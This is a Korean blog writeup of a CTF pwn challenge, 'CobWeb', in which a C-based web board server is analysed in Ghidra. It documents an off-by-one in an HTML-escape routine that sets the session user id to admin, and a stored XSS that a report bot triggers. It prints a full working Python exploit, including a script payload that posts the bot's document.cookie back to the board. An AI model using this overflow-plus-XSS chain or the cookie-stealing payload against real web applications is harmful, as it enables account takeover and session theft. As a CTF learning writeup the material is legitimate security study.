---
title: "[Codegate Junior Preliminary Quals] CobWeb writeup"
published: 2026-04-23
category: CTF
description: 코게 주니어 예선
tags: [CTF, writeup, codegate2026]
draft: false
---

# Codegate - CobWeb

아니.. 이게 `conero` 문제에서 적다 배우고 밀리다 겹치고..  
별 이상하게 엉켰다. 배운 건 많은데 롸업을 완성하지 못했다.  
완성할 시간도 충분히 있었는데, 다른 거 하느라 그런 듯, 그래서  

내가 풀었던 `pwnable` 종류의 문제 중 하나인 **cobweb**을 적기로 함.  
읽기 쉽게 바뀐 부분은 글 맨 아래에 첨부했음

---
## Description
> I wanted to create a web application.. but I don't know how to use web frameworks.
> So I decided to use pure C to make a web application!

쉬운 문제로 보였고, 실제로 쉽기도 했다.  
약간 웹해킹 문제를 재밌게 만들고 싶어서 이쪽으로 넣은 것 같기도 하다.  

- **카테고리**: Pwn
- **주제**: C로 만든 낭만적인 웹 앱(??;; )

---
## 정적 분석
#### 파일 둘러봄
그나마 경험이 있어서 `nm`이랑 `strings`를 잘 썼냐고 물어볼 것이다.  
아니? 난 기드라부터 열었다.  

우리는 이것을 원시인이라고 부른다.  
아니, 정확히는 원시인도 아니고 현대인의 탈을 쓴 원시인이다.  

바이너리에 대한 정보도 없이 그냥 디컴파일러 켜버린 나를 생각하면 아직도 어처구니가 없다.
참.. 그 기드라에서의 여정을 여기에 담고 싶지만 롸업이라 나중에 번외로 한꺼번에 모아서 내보겠다.  

파일은 이렇다. `Stripped` 되어있기에 `strings`로 적당히 정보만 뽑아내고 들어가자.
```bash
./board_server: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),  
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  
BuildID[sha1]=c77cc115ae1be0d5856540a5f38e881fdc41cf0d, for GNU/Linux 3.2.0, stripped
```

문제에서 제공된 나머지 파일들의 내용들도 첨부하려 했지만  
`ctf-archives` 레포가 워낙 유명하니까 그냥 이쪽에서 받아 쓰시면 될듯  

그래서 의미있는 파일의 내용을 첨부하자면:  

`ctf.xinetd`,
```bash
# ctf.xinetd
service ctf
{
    disable         = no
    socket_type     = stream
    wait            = no
    user            = root
    server          = /home/ctf/run.sh
    log_on_failure  += USERID
    port            = 9883
    type            = UNLISTED
    protocol        = tcp
    flags           = REUSE
}
```
그리고 `run.sh`가 있다.
```sh
#!/bin/bash
RAND=$(od -An -N2 -tu2 /dev/urandom | tr -d ' ')
NUM=$((RAND % 50001 + 10000))
timeout 60 su -c "/home/ctf/board_server $NUM" ctf
rm -rf /home/ctf/data/board_${NUM}.db
```

**서버 런처**는 `9883`포트 고정, **실제 웹서버**는 `10000`~`60000` 포트 사이로 결정된다.  

또 중요한 `bot.py`를 보면:  
```python
def read_url(url, flag, session_id):
    ...
    try:
        driver.add_cookie({"name": "session_id", "value": session_id})
        driver.add_cookie({"name": "flag", "value": flag})
        driver.get(url)
        ...
    except:
        ...
    ...
```
이 봇은 `/post/{id}`를 조회하는 동작을 수행한다.  
약간 `XSS` 문제 느낌..

---
#### strings로 둘러봄
이제 `strings`로 유의미한 값들 좀 둘러보자.  
```bash
/board
/login
/register
/logout
session_id=; Max-Age=0
/post/new
/post/
...
/delete
...
/post/%d
/report
...
/post/%d/edit
/post/new
```

대략적으로 뽑아봤다.  
포함된 정보는 다음과 같음:

1. 엔드포인트
2. SQL

근데 하필 노출된 쿼리가  
```sql
...(CREATE 제외)
INSERT INTO users (id, username, password) VALUES (0, 'admin', 'x$x')
INSERT INTO posts (user_id, title, content) VALUES (?, ?, ?);
UPDATE posts SET title = ?, content = ?, user_id = 0 WHERE id = ?;
UPDATE posts SET title = ?, content = ? WHERE id = ? AND user_id = ?;
```
일단 **관리자 id가 `0`** 이고, 비번은 모르겠음..  
대신 `UPDATE`문으로 작성된 쿼리에서 `user_id=0`이라고 **고정적으로** 다룰 수 있는 부분이 있다.  

관리자가 쓴 글 수정 가능하다는 게 가능하면 좀 사기일지도.  

아무튼 비번에 관해 언급하지 않은 이유는 간단하다.  
문제 파일이 전체적으로 제공되었다는 점에서 비번이 `x$x` 처럼 생겼다면 이건 백퍼!!!  

대충 해쉬된 값이다. 라는 암시인 거ㅋ

---
## 정적 분석-2
구라안치고 여기 쓰고 싶은 내용이 너무 많다. 번외편을 얼른 올리고 싶은데,  
그러자니 롸업을 써야 하고, 도중엔 또 잡생각 들어서 적으려 하고... 참 쉽지 않다.  

든든한 친구에게 맡기면 되지 않냐, 라고 묻는다면  
당연히 아니다, 롸업은 이 재미로 쓰는 거지 내가 딴 게 뭐 할 거 있다고  
이걸 버림?! 시간이 남아도니 이런다.. 나도 얼른 고수가 되고 싶다  

---
#### Off-By-One

이어서,  
```c
// handle_client_request @ 0x00102ba0 (요약)
if (method == POST && path matches "/post/<id>/edit") {
    title = thunk_extract_form_field_value(..., "title");
    content = thunk_extract_form_field_value(..., "content");
    op_result = update_post(post_id, sess_user_id, title, content);
}
```
이렇게 생긴 부분이 포함돼있다.  
ㄹㅇ 겉으로만 봐선 전혀 문제가 없음. 내가 이상한 걸지도  

취약점은 `update_post()`에서 먼저 시작된다.  
함수 내는 대략 이렇게 생겼는데,  

```c
// update_post @ 0x001045c0
FUN_00105270(puVar1, param_3, 0x600);   // title escape
FUN_00105270(puVar2, param_4, 0x6000);  // content escape

if (*(int *)(puVar5 + 0x4ff0) == 0) {
    // admin path: ownership check 없이 업데이트
    sqlite3_prepare_v2(db,
      "UPDATE posts SET title=?, content=?, user_id=0 WHERE id=?;", ...);
} else {
    // normal path: ownership check
    sqlite3_prepare_v2(db,
      "UPDATE posts SET title=?, content=? WHERE id=? AND user_id=?;", ...);
}
```

디컴파일이 완벽한 건 아니라 인자를 따라가면 변수에서 `-` 연산으로 값을 넣는 게 보인다.  
이것 때문에 고생할 뻔 했다.  

`puVarr5+0x4ff0` < 얘가 이거임 (`*(undefined4 *)(puVar5 + 0x4ff0) = param_2;`)  
`param2`가 `uid`였으니까, `uid`가 0이면 그냥 고정적으로 관리자로서 글을 쓰게 되는 부분인 것 같다.  

내가 말하고자 하는 부분을 알 거라고 생각한다.  
그래!!! 바로 `html escape`하는 녀석이 범인이다.  

```c
  *(undefined8 *)(puVar5 + -0x1628) = 0x104638;
  html_escape(puVar1,param_3,0x600);
  *(undefined8 *)(puVar5 + -0x1628) = 0x104648;
  html_escape(puVar2,param_4,0x6000);
```
이렇게 호출됐고, 내부는  

```c
  cVar2 = *param_2;
  if (cVar2 != '\0') {
    uVar1 = 0;
    do {
      param_2 = param_2 + 1;
      switch(cVar2) {
      case '\"':
        builtin_strncpy(param_1 + uVar1,"&quot;",7);
        uVar1 = uVar1 + 6;
        break;
      default:
        param_1[uVar1] = cVar2;
        uVar1 = uVar1 + 1;
        break;
      case '&':
        builtin_strncpy(param_1 + uVar1,"&amp;",6);
        uVar1 = uVar1 + 5;
        break;
      case '\'':
        builtin_strncpy(param_1 + uVar1,"&#39;",6);
        uVar1 = uVar1 + 5;
        break;
      case '<':
        builtin_strncpy(param_1 + uVar1,"&lt;",5);
        uVar1 = uVar1 + 4;
        break;
      case '>':
        builtin_strncpy(param_1 + uVar1,"&gt;",5);
        uVar1 = uVar1 + 4;
      }
      cVar2 = *param_2;
    } while ((cVar2 != '\0') && (uVar1 <= param_3 - 6U));
    param_1 = param_1 + uVar1;
  }
  *param_1 = 0;
```

위처럼 생겼다.  
종료 조건은 널 바이트를 만났고, `uVar1`이 `param_3 - 6` 이하여야 한다. 이거임.  

case에 따라 uVar를 `6, 1, 5, 4` 만큼 증가시키게 되어있음.  
만약 `"`만 계속 넣어서 6의 배수로 길이를 맞춘 뒤 저 조건을 통과하게 되면  
원하는 `html_escape(puVar2,param_4,0x6000);`를 꽉 채워 돌릴 수 있다.
그리고 저 부분이 마지막 1바이트가 넘어가는 `Off-By-One`이셔서 뒤에 있는 게 중요한 값이면 됨.  

또 그 끔찍한 스택프레임 때려 맞추기였나.. 아닌가, 이거 뒤에 변수 있었나 했더니,  

`content` 버퍼가 `puVar5 + (-0x1010)`에 있는 것 아니겠는가!!!  

심지어 거리도 정확히 딱 `0x6000`임. **이거 말이 안됨.**  

이럼 이제 관리자가 쓴 글로 탈@바꿈되는겨;;  

---
#### XSS
```c
// render_post_detail_page @ 0x00105ab0
if (param_2[1] == 0) {
    FUN_00105370(tmp, param_2 + 0x192, 0x1000); // html_unescape
    content_ptr = tmp;
} else {
    content_ptr = param_2 + 0x192;              // decode 안 함
}
```

`/GET`라우팅 중 게시글 정보를 가져오는 부분을 보면,  
`uid`가 `0`인 경우 `html_unescape()`를 호출하여 조회한다.  
즉, **Stored XSS**가 되는 셈이다.  

그럼 봇이 이걸 어떻게 조회하게 할까?  

다시 `bot.py`를 보도록 하지.  

```python
port = sys.argv[1]
post = sys.argv[2]
session_id = sys.argv[3]
...
if __name__ == "__main__":
    print(read_url(f"http://127.0.0.1:{port}/post/{post}/", FLAG, session_id))
```

걍 플래그 가지고 실행 시 주어진 포트/포스트 조회하는 역할을 한다. 그럼 이걸 수행하는  
기능이 `board_server` 바이너리에 있기 마련, 바로..  

`ulong submit_post_report(undefined4 param_1)` 함수에 그런 기능이 있다.  

대충 정리해주면
```c
...

  __snprintf_chk(auStack_358,0x10,2,0x10,"%d",g_server_port);
  __snprintf_chk(local_348,0x10,2,0x10,"%d",param_1);
  lVar2 = create_session(0,"admin");
  if (lVar2 != 0) {
    __snprintf_chk(local_238,0x200,2,0x200,"/usr/bin/python3 /home/ctf/bot.py %s %s %s",auStack_ 358,
                   local_348,lVar2);
    __stream = popen(local_238,"r");

...
```

그래서!!! 정리하면 이렇게 된다:  

- POST /post/<id>/edit에서 html_escape off-by-one
- sess_user_id를 0으로 변조
- update_post admin 분기 진입 (user_id=0으로 저장)
- 상세 페이지에서 html_unescape로 Stored XSS 활성화
- report로 봇 방문 유도
- 플래그 탈취

---
## Exploit
롸업을 쓰는 것에 있어 시간이 오래 걸리는 바람에 어쩔 수 없이 로컬에서 진행했다.  
물론 그 때 당시 썼던 익스코드가 남아있긴 하다.  

```python
#!/usr/bin/env python3
"""
Local reproduction exploit for CobWeb challenge.

Run inside container:
  python3 /home/ctf/exploit_local.py
"""

import http.client
import os
import re
import socket
import sys
import time
import urllib.parse

HOST = os.getenv("HOST", "127.0.0.1")
PORT = int(os.getenv("PORT", "9883"))


def boot(host=HOST, port=PORT):
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(1.5)
    buf = b""
    for _ in range(30):
        try:
            d = s.recv(4096)
            if not d:
                break
            buf += d
            if b"http://localhost:" in buf:
                break
        except Exception:
            time.sleep(0.1)
    txt = buf.decode("latin1", "ignore")
    m = re.search(r"port\s+(\d+)", txt)
    if not m:
        raise RuntimeError(f"Cannot parse port from banner: {txt!r}")
    return s, int(m.group(1)), txt


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.jar = {}

    def req(self, path, method="GET", data=None, headers=None, raw_body=None):
        c = http.client.HTTPConnection(self.host, self.port, timeout=10)
        h = {"Host": self.host}
        if self.jar:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.jar.items())
        if headers:
            h.update(headers)
        body = raw_body
        if data is not None:
            body = urllib.parse.urlencode(data)
            h["Content-Type"] = "application/x-www-form-urlencoded"
        if body is not None:
            h["Content-Length"] = str(len(body))
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        rb = r.read()
        sc = r.getheader("Set-Cookie")
        if sc:
            kv = sc.split(";", 1)[0]
            if "=" in kv:
                k, v = kv.split("=", 1)
                if v:
                    self.jar[k] = v
                elif k in self.jar:
                    del self.jar[k]
        loc = r.getheader("Location")
        st = r.status
        c.close()
        return st, rb, loc


def html_encode_len(s):
    n = 0
    for c in s:
        if c in "<>":
            n += 4
        elif c == "&":
            n += 5
        elif c == '"':
            n += 6
        elif c == "'":
            n += 5
        else:
            n += 1
    return n


def build_payload():
    xss = (
        "<script>"
        "var x=new XMLHttpRequest();"
        "x.open('POST','/post/new',false);"
        "x.send(new URLSearchParams({title:'f',content:document.cookie}))"
        "</script>"
    )

    target = 0x6000
    xss_enc = html_encode_len(xss)
    remaining = target - xss_enc
    pad = remaining % 6
    num_quotes = (remaining - pad) // 6
    content = xss + ("A" * pad) + ('"' * num_quotes)
    total = html_encode_len(content)
    assert total == target, f"encoded length {total} != {target}"
    return content


def main():
    print(f"[*] Connecting to launcher {HOST}:{PORT}")
    keep, webport, banner = boot()
    print(f"[*] Parsed web port: {webport}")
    print(f"[*] Banner: {banner.strip()[:200]}")

    cli = Client("127.0.0.1", webport)

    # Register/login
    base = "pwn" + str(int(time.time() * 1000))[-8:]
    logged = False
    for i in range(10):
        user = f"{base}{i}"
        cli.req("/register", "POST", {"username": user, "password": "pass1234"})
        cli.req("/login", "POST", {"username": user, "password": "pass1234"})
        if "session_id" in cli.jar:
            print(f"[+] Logged in as {user}")
            logged = True
            break
    if not logged:
        raise RuntimeError("login failed")

    # Create base post
    pid = None
    for i in range(10):
        st, rb, loc = cli.req("/post/new", "POST", {"title": f"t{i}", "content": "x"})
        if st in (302, 303) and loc:
            m = re.search(r"/post/(\d+)", loc)
            if m:
                pid = int(m.group(1))
                break
        st2, rb2, _ = cli.req("/board")
        ids = [int(x) for x in re.findall(rb"/post/(\d+)", rb2)]
        if ids:
            pid = max(ids)
            break
    if pid is None:
        raise RuntimeError("post create failed")
    print(f"[+] Base post id={pid}")

    # Overwrite + XSS payload
    content = build_payload()
    raw = "title=xss&content=" + content
    st, rb, loc = cli.req(
        f"/post/{pid}/edit",
        "POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        raw_body=raw,
    )
    print(f"[*] Edit: status={st} loc={loc}")

    st, rb, _ = cli.req(f"/post/{pid}/")
    page = rb.decode("latin1", "ignore")
    if "<script>" in page:
        print("[+] Stored XSS appears in post page")
    else:
        print("[-] XSS not visible; exploit might have failed")

    # Trigger bot
    st, rb, _ = cli.req(f"/post/{pid}/report", "POST")
    print(f"[*] Report status={st}")
    time.sleep(8)

    # Fetch flag
    st, rb, _ = cli.req("/board")
    board = rb.decode("latin1", "ignore")
    ids = sorted(set(int(x) for x in re.findall(r"/post/(\d+)", board)))
    print(f"[*] Board ids: {ids}")
    flag = None
    for check_pid in ids:
        if check_pid == pid:
            continue
        st, rb, _ = cli.req(f"/post/{check_pid}/")
        body = rb.decode("latin1", "ignore")
        m = re.search(r"codegate2026\{[^}]+\}", body)
        if m:
            flag = m.group(0)
            break
        if "flag=" in body:
            m2 = re.search(r"flag=([^<\\s]+)", body)
            if m2:
                flag = m2.group(1)
                break

    keep.close()
    if flag:
        print(f"[+] FLAG: {flag}")
        return 0
    print("[-] Flag not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

---

+)
```c
// readable reconstruction (not exact original source)

typedef struct {
    int user_id;
    char username[64];
    char session_id[65];
} SessionCtx;

typedef struct {
    char method[16];          // "GET", "POST"
    char path[256];           // "/post/1/edit"
    char query[512];
    int header_count;
    char cookie[256];
    char body[0x2000];
} HttpRequest;

typedef struct {
    int status_code;
    char status_text[64];
    char content_type[64];
    char set_cookie[256];
    char location[256];
    char body[0x10000];
    int body_len;
} HttpResponse;

static int extract_session_id_from_cookie(const char *cookie, char out[65]) {
    const char *p = strstr(cookie, "session_id=");
    if (!p) return -1;
    p += 11; // strlen("session_id=")

    int i = 0;
    while (*p && *p != ';' && i < 64) {
        out[i++] = *p++;
    }
    out[i] = '\0';
    return (i > 0) ? 0 : -1;
}

void handle_client_request(int client_fd) {
    char raw_request_buf[0x2000] = {0};
    HttpRequest req = {0};
    HttpResponse resp = {0};
    SessionCtx sess = {0};
    char session_id_buf[65] = {0};

    // 1) receive + parse
    ssize_t n = recv(client_fd, raw_request_buf, 0x1fff, 0);
    if (n <= 0) goto END;

    if (parse_http_request(raw_request_buf, &req) != 0) {
        init_http_response(&resp);
        render_error_page(&resp, 400, "Wrong request.");
        send_http_response(client_fd, &resp);
        goto END;
    }

    // 2) auth check from cookie
    int has_session = 0;
    if (req.cookie[0] != '\0') {
        if (extract_session_id_from_cookie(req.cookie, session_id_buf) == 0) {
            has_session = (validate_session(session_id_buf, &sess) == 0);
        }
    }

    init_http_response(&resp);

    // ---------------- GET ----------------
    if (!strcmp(req.method, "GET")) {
        if (!strcmp(req.path, "/") || !strcmp(req.path, "/board")) {
            if (!has_session) set_redirect_response(&resp, "/login");
            else render_board_page(&resp, &sess);
        }
        else if (!strcmp(req.path, "/login")) {
            if (!has_session) render_login_page(&resp, NULL);
            else set_redirect_response(&resp, "/board");
        }
        else if (!strcmp(req.path, "/register")) {
            if (!has_session) render_register_page(&resp, NULL);
            else set_redirect_response(&resp, "/board");
        }
        else if (!strcmp(req.path, "/logout")) {
            if (has_session) invalidate_session(session_id_buf);
            set_response_cookie(&resp, "session_id=; Max-Age=0");
        }
        else if (!strcmp(req.path, "/post/new")) {
            if (!has_session) set_redirect_response(&resp, "/login");
            else render_post_form_page(&resp, &sess, NULL);
        }
        else if (!strncmp(req.path, "/post/", 6)) {
            int post_id = 0;
            if (parse_positive_int(req.path + 6, &post_id) != 0 || post_id < 1) {
                render_error_page(&resp, 400, "Wrong post ID.");
                goto SEND;
            }

            // /post/<id>/edit
            if (strstr(req.path, "/edit")) {
                Post p;
                if (fetch_post_by_id(post_id, &p) != 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else if (p.user_id != sess.user_id) {
                    render_error_page(&resp, 403, "Edit failed.");
                } else {
                    render_post_form_page(&resp, &sess, &p);
                }
            }
            // /post/<id>/delete
            else if (strstr(req.path, "/delete")) {
                Post p;
                if (fetch_post_by_id(post_id, &p) != 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else if (p.user_id != sess.user_id) {
                    render_error_page(&resp, 403, "Deletion failed.");
                } else {
                    render_delete_confirm_page(&resp, &p, &sess);
                }
            }
            // /post/<id> (detail)
            else {
                Post p;
                if (fetch_post_by_id(post_id, &p) != 0) {
                    render_error_page(&resp, 404, "Post not found.");
                } else {
                    render_post_detail_page(&resp, &p, &sess);
                }
            }
        } else {
            render_error_page(&resp, 404, "Page not found.");
        }
    }

    // ---------------- POST ----------------
    else if (!strcmp(req.method, "POST")) {
        // POST /login
        if (!strcmp(req.path, "/login")) {
            char *username = extract_form_field_value(req.body, "username");
            char *password = extract_form_field_value(req.body, "password");

            if (!username || !password) {
                render_login_page(&resp, "Please enter your ID and password.");
            } else {
                int uid = -1;
                if (verify_user_credentials(username, password, &uid) == 0) {
                    char *sid = create_session(uid, username);
                    if (!sid) {
                        render_login_page(&resp, "Session creation failed.");
                    } else {
                        char cookie[128];
                        snprintf(cookie, sizeof(cookie), "session_id=%s; HttpOnly", sid);
                        set_response_cookie(&resp, cookie);
                        set_redirect_response(&resp, "/board");
                        free(sid);
                    }
                } else {
                    render_login_page(&resp, "ID or password is incorrect.");
                }
            }

            free(username);
            free(password);
        }

        // POST /register
        else if (!strcmp(req.path, "/register")) {
            char *username = extract_form_field_value(req.body, "username");
            char *password = extract_form_field_value(req.body, "password");

            if (!username || !password || strlen(username) < 3 || strlen(password) < 4) {
                render_register_page(&resp,
                    "ID must be at least 3 characters, password must be at least 4 characters.");
            } else if (create_user_account(username, password) == 0) {
                set_redirect_response(&resp, "/login");
            } else {
                render_register_page(&resp, "Registration failed. Please try again.");
            }

            free(username);
            free(password);
        }

        // POST /post/new
        else if (!strcmp(req.path, "/post/new")) {
            if (!has_session) {
                set_redirect_response(&resp, "/login");
            } else {
                char *title = extract_form_field_value(req.body, "title");
                char *content = extract_form_field_value(req.body, "content");
                if (!title || !content || !title[0]) {
                    render_error_page(&resp, 400, "Please enter a title.");
                } else if (create_post(sess.user_id, title, content) == 0) {
                    set_redirect_response(&resp, "/board");
                } else {
                    render_error_page(&resp, 500, "Post creation failed.");
                }
                free(title);
                free(content);
            }
        }

        // POST /post/<id>/(edit|delete|report)
        else if (!strncmp(req.path, "/post/", 6)) {
            if (!has_session) {
                set_redirect_response(&resp, "/login");
            } else {
                int post_id = 0;
                if (parse_positive_int(req.path + 6, &post_id) != 0 || post_id < 1) {
                    render_error_page(&resp, 400, "Wrong post ID.");
                } else if (strstr(req.path, "/edit")) {
                    char *title = extract_form_field_value(req.body, "title");
                    char *content = extract_form_field_value(req.body, "content");
                    if (!title || !content || !title[0]) {
                        render_error_page(&resp, 400, "Please enter a title.");
                    } else if (update_post(post_id, sess.user_id, title, content) == 0) {
                        char loc[64];
                        snprintf(loc, sizeof(loc), "/post/%d", post_id);
                        set_redirect_response(&resp, loc);
                    } else {
                        render_error_page(&resp, 403, "Edit failed.");
                    }
                    free(title);
                    free(content);
                } else if (strstr(req.path, "/delete")) {
                    if (delete_post(post_id, sess.user_id) == 0) {
                        set_redirect_response(&resp, "/board");
                    } else {
                        render_error_page(&resp, 403, "Deletion failed.");
                    }
                } else if (strstr(req.path, "/report")) {
                    int r = submit_post_report(post_id);
                    if (r == 1) {
                        render_error_page(&resp, 200,
                            "Report has been submitted. Admin will check your post soon.");
                    } else if (r == 0) {
                        render_error_page(&resp, 500,
                            "Failed to submit report. Please try again later.");
                    } else {
                        render_error_page(&resp, 500,
                            "An error occurred while processing your report.");
                    }
                } else {
                    render_error_page(&resp, 404, "Page not found.");
                }
            }
        } else {
            render_error_page(&resp, 404, "Page not found.");
        }
    }

    // unsupported method
    else {
        render_error_page(&resp, 405, "This method is not allowed.");
    }

SEND:
    send_http_response(client_fd, &resp);

END:
    return;
}

```

---
## 번외:

게을러서 이거 쓰느라 시간이 너무 걸렸다. 요새 근황은  

- CTF 몇 개 준비
- 롸업 밀린 거 쓰기
- 번외 준비
- 이외 알려지면 좀 쿠사리 먹을 만한 것들 공부

...이렇게 되었다.  
솔직히 요즘 기강이 살짝 풀려서 이것들도 약간 밀렸다.